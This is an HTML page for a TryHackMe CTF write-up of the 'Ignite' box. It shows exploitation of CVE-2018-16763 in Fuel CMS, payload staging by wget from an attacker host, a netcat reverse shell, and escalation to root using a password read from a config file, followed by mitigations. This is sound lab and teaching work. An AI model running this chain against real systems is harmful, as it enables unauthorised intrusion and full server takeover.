@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Ignite — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="The homepage announces "Welcome to FUEL CMS" directly in the title — no version fingerprinting needed before pulling Fuel CMS exploits from Exploit-DB.…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/ignite.html">
+<meta property="og:title" content="Ignite — TryHackMe writeup">
+<meta property="og:description" content="The homepage announces "Welcome to FUEL CMS" directly in the title — no version fingerprinting needed before pulling Fuel CMS exploits from Exploit-DB.…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/ignite.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Ignite — TryHackMe writeup","description":"The homepage announces \"Welcome to FUEL CMS\" directly in the title — no version fingerprinting needed before pulling Fuel CMS exploits from Exploit-DB.…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-22","url":"https://thecyberfarhan.github.io/writeups/ignite.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/ignite.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Ignite</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 22, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>The homepage announces "Welcome to FUEL CMS" directly in the title — no version fingerprinting needed before pulling Fuel CMS exploits from Exploit-DB. CVE-2018-16763 (an authentication-bypass RCE in Fuel CMS 1.4.1) provided an interactive pseudo-shell through which a proper PHP reverse shell was staged via <code>wget</code> and triggered over HTTP. From <code>www-data</code>, the CMS's own database config file leaked the MySQL root password in plaintext — which turned out to be reused as the Linux root password too. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🔍 searchsploit</span><span class="chip">🐍 CVE-2018-16763 exploit script (EDB-50477)</span><span class="chip">🌐 Python HTTP server</span><span class="chip">🐚 Netcat</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Ignite</strong> — a box that names its own vulnerability in the page title, which is either refreshingly honest or a significant operational security failure depending on your perspective. Fuel CMS 1.4.1 carries a well-documented unauthenticated RCE, and once that door opens, the rest of the box leans on a mistake seen constantly in real engagements: a database credential, sitting in plaintext in a configuration file, reused verbatim as the root system password. No clever escalation chain required — just reading a file everyone forgets is sensitive because "it's just a config file."</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>How to use <code>searchsploit</code> to find and retrieve local copies of Exploit-DB entries</li><li>What CVE-2018-16763 is at a conceptual level (Fuel CMS authentication bypass to RCE)</li><li>How to stage a payload via <code>wget</code> from a pseudo-shell and trigger it over HTTP</li><li>Why credential reuse between a database account and a system account is dangerous</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<pre><code>rustscan -a 10.49.166.110 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.18 (Ubuntu) — "Welcome to FUEL CMS"</td></tr></tbody></table>
+<p>A single open port. The HTTP title removes any ambiguity about what's running.</p>
+<h3>Web Directory Enumeration</h3>
+<pre><code>feroxbuster -u http://10.49.166.110/ \
+  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+  -x php,xt,html</code></pre>
+
+<pre><code>301  /fuel             # admin panel root
+200  /fuel/login       # login form
+302  /fuel/dashboard  →  /fuel/login/&lt;token&gt;   # auth-gated, redirects when unauthenticated</code></pre>
+<p>The <code>/fuel/</code> admin structure is fully exposed, confirming the CMS identity. No version number is directly visible on the page, but the title alone is enough to search for known exploits.</p>
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~5 mins into the box)</p>
+<h3>CVE-2018-16763 — Fuel CMS Unauthenticated RCE</h3>
+<p><strong>What is this vulnerability?</strong> Fuel CMS versions up to and including 1.4.1 contain a flaw in how the application evaluates certain input — an attacker can manipulate request parameters such that arbitrary PHP code is evaluated server-side, without any authentication. This was assigned CVE-2018-16763 and has multiple public proof-of-concept exploits.</p>
+<p class="aside">Searching local Exploit-DB mirror for Fuel CMS exploits:</p>
+<pre><code>searchsploit fuel cms</code></pre>
+
+<pre><code>Fuel CMS 1.4.1 - Remote Code Execution (1)   linux/webapps/47138.py
+Fuel CMS 1.4.1 - Remote Code Execution (2)   php/webapps/49487.rb
+Fuel CMS 1.4.1 - Remote Code Execution (3)   php/webapps/50477.py</code></pre>
+<p class="aside">Copying the third RCE script locally:</p>
+<pre><code>searchsploit -m php/webapps/50477.py</code></pre>
+<p class="aside">Running the exploit against the target:</p>
+<pre><code>python 50477.py -u http://10.49.166.110</code></pre>
+
+<pre><code>[+]Connecting...
+Enter Command $</code></pre>
+<p>An interactive pseudo-shell, command-by-command — not a full reverse shell, but enough to stage one.</p>
+<p class="aside">Confirming basic command execution:</p>
+<pre><code>Enter Command $ls
+README.md  assets  composer.json  contributing.md  fuel  index.php  robots.txt
+
+Enter Command $pwd
+/var/www/html</code></pre>
+
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">(~8 mins into the box)</p>
+<h3>Staging a Proper Reverse Shell</h3>
+<p>The exploit's pseudo-shell is functional but limited — no interactivity for tools requiring a TTY, no persistence. The standard move: use it to pull down a real PHP reverse shell via <code>wget</code>, then trigger that file directly over HTTP.</p>
+<p class="aside">Serving the PHP reverse shell from the attacking machine:</p>
+<pre><code>python3 -m http.server 80</code></pre>
+<p class="aside">Downloading it via the pseudo-shell:</p>
+<pre><code>Enter Command $wget http://192.168.134.217/php-reverse-shell.php</code></pre>
+<p>The download fired repeatedly (visible as <code>.1</code>, <code>.2</code>, <code>.3</code>... duplicate files in the listing) — the exploit script appears to issue the command multiple times internally, which is harmless here since <code>wget</code> simply creates incrementing filenames rather than failing.</p>
+<p class="aside">Confirming the file landed:</p>
+<pre><code>Enter Command $ls
+... php-reverse-shell.php  php-reverse-shell.php.1  ... php-reverse-shell.php.12 ...</code></pre>
+<p class="aside">Setting up the listener, then triggering the original (non-duplicated) file directly:</p>
+<pre><code>nc -nvlp 4444</code></pre>
+
+<pre><code># browser/curl: http://10.49.166.110/php-reverse-shell.php</code></pre>
+
+<pre><code>connect to [192.168.134.217] from (UNKNOWN) [10.49.166.110] 38770
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+<p class="aside">Stabilising:</p>
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+<p class="aside">Collecting the user flag:</p>
+<pre><code>cat /home/www-data/flag.txt
+# 6470e394cbf6dab6a91682cc8585059b</code></pre>
+
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~12 mins into the box)</p>
+<h3>Database Config Credential Reuse</h3>
+<p>Standard CodeIgniter/Fuel CMS structure places database credentials in a predictable config file:</p>
+<pre><code>cd /var/www/html/fuel/application/config
+cat database.php</code></pre>
+
+<pre><code>$db['default'] = array(
+    'hostname' =&gt; 'localhost',
+    'username' =&gt; 'root',
+    'password' =&gt; 'mememe',
+    'database' =&gt; 'fuel_schema',
+    ...
+);</code></pre>
+<p>MySQL root password: <code>mememe</code>. Worth testing immediately against the Linux accounts — database and system credential reuse is depressingly common.</p>
+<p class="aside">First attempt — <code>sudo su</code> with the DB password:</p>
+<pre><code>sudo su
+# [sudo] password for www-data: mememe
+# Sorry, try again. (x3)</code></pre>
+<p><code>www-data</code> has no valid <code>sudo</code> password matching this — expected, since <code>www-data</code> typically has no interactive login credentials at all.</p>
+<p class="aside">Second attempt — <code>su</code> directly to root:</p>
+<pre><code>su
+# Password: mememe</code></pre>
+
+<pre><code>root@ubuntu:~# cat root.txt
+b9bbcb33e11b80be759c4e844862482d</code></pre>
+<p>The MySQL root password and the Linux root password are identical.</p>
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>Page title</strong> identified Fuel CMS directly; <code>searchsploit</code> found CVE-2018-16763</li><li><strong>EDB-50477</strong> exploit → pseudo-shell, no authentication required</li><li><strong><code>wget</code> from pseudo-shell</strong> → staged a full PHP reverse shell in the webroot</li><li><strong>HTTP trigger</strong> → reverse shell as <code>www-data</code> → user flag</li><li><strong><code>application/config/database.php</code></strong> → MySQL root password <code>mememe</code></li><li><strong><code>su</code> (not <code>sudo su</code>)</strong> → password reuse → Linux root → root flag</li></ol>
+<h2 data-reveal>Rabbit Holes</h2>
+<h3><code>sudo su</code> Before Plain <code>su</code></h3>
+<p>The first escalation attempt used <code>sudo su</code>, which failed three times with the correct-looking password. The distinction matters: <code>sudo</code> asks for the *calling user's own* password (here, <code>www-data</code>, which has no usable interactive password), while <code>su</code> asks for the *target user's* password (<code>root</code>'s own password). Since the leaked credential was reused as root's actual login password — not as a sudo grant for <code>www-data</code> — only the second form worked. A useful general reminder: when a found password doesn't work with <code>sudo</code>, try it with <code>su</code> before assuming it's the wrong credential entirely.</p>
+<h3>Duplicate File Downloads via the Exploit's wget Command</h3>
+<p>Running the <code>wget</code> command once through the pseudo-shell apparently issued the underlying HTTP request multiple times internally (resulting in <code>php-reverse-shell.php.1</code> through <code>.12</code>), based on the directory listing immediately afterward. This didn't cause any functional problem — the original un-suffixed file was still valid and triggered the shell correctly — but it's a quirk worth expecting when using this particular exploit script.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Fuel CMS 1.4.1 unauthenticated RCE (CVE-2018-16763)</td><td class="sev-critical">Critical</td><td>Update Fuel CMS to a patched release; subscribe to CMS-specific security advisories</td></tr><tr><td>CMS identity disclosed directly in page title</td><td>Low</td><td>Avoid exposing exact CMS name/version in publicly visible page metadata where avoidable</td></tr><tr><td>Database credentials stored in plaintext config file</td><td class="sev-high">High</td><td>Use environment variables or a secrets manager for database credentials rather than committing them to a readable PHP config file</td></tr><tr><td>Database root password reused as system root password</td><td class="sev-critical">Critical</td><td>Never reuse credentials across different privilege boundaries (database vs. OS); use unique, randomly generated passwords for each</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>When a discovered credential fails against <code>sudo</code>, try it against <code>su</code> before discarding it — the two commands check entirely different passwords (the caller's vs. the target account's), and a credential leaked from an application config file is far more likely to match a direct account password than a <code>sudo</code> grant for an unrelated service account.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Go straight to staging a full reverse shell via the exploit's command execution rather than exploring with the pseudo-shell first — the pseudo-shell's one-command-at-a-time interface is useful for verification but slower than just landing a proper interactive shell immediately.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/ignite_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
